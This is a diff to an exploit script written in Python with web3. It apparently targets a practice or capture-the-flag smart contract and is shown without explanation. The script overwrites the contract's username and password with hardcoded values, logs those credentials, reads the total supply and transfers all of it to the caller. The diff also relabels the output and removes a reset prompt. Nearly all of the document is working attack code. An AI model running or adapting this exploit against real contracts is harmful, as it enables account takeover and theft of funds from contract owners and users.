@@ -77,13 +77,14 @@ logger.info("Get Contract Functions: " + str(cur_cont_funcs))
 
 # SET PASSWORD AND NEW USER
 
-exploit1 = cur_cont_funcs.setUsername('fucky123').transact()
+exploit1 = cur_cont_funcs.setUsername('fuc123root').transact()
+logger.critical("REMEMBER: Username: fuc123root , Password:7b45r5ca1")
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit1))
 logger.info("Waiting for transaction to be mined...")
 receipt = w3eng.eth.waitForTransactionReceipt(exploit1)
 w3eng.eth.getTransactionReceipt(exploit1)
 
-exploit2 = cur_cont_funcs.setPassword('7b455ca1').transact()
+exploit2 = cur_cont_funcs.setPassword('fe9ed8836679fd78f8cd8956b77e254b').transact()  # md5-hashed: 7b45r5ca1
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit2))
 logger.info("Waiting for transaction to be mined...")
 receipt = w3eng.eth.waitForTransactionReceipt(exploit2)
@@ -101,7 +102,6 @@ logger.info("All supply will be transfered.")
 
 exploitXII = cur_cont_funcs.getSupply().call()
 logger.critical("Current supply: " + str(exploitXII))
-time.sleep(5)
 
 exploit4 = cur_cont_funcs.transfer(int(exploitXII)).transact()
 logger.info("Transaction sent, Hash is: " + Web3.toHex(exploit4))
@@ -113,24 +113,18 @@ w3eng.eth.getTransactionReceipt(exploit4)
 
 print("Current Account Info: ")
 exploit5 = cur_cont_funcs.getUsername().call()
-print(exploit5)
+print("Username: " + exploit5)
 
 exploit6 = cur_cont_funcs.getPassword().call()
-print(exploit6)
+print("MD5 hashed password: " + exploit6)
 
 exploit7 = cur_cont_funcs.getApprove().call()
-print(exploit7)
+print("Approved: " + str(exploit7))
 
 exploit8 = cur_cont_funcs.getSupply().call()
-print(exploit8)
+print("Now Supply: " + str(exploit8) + "/1000")
 
 exploit9 = cur_cont_funcs.getBalance().call()
-print(exploit9)
+print("Your account balance: " + str(exploit9))
 
 logger.info("DONE!")
-
-rstflag = input("Do you need to reset?(uppercase Y/N)")
-if rstflag == "Y":
-    exploitX = cur_cont_funcs.reset().call()
-    print(exploitX)
-    logger.info("RESETED!")
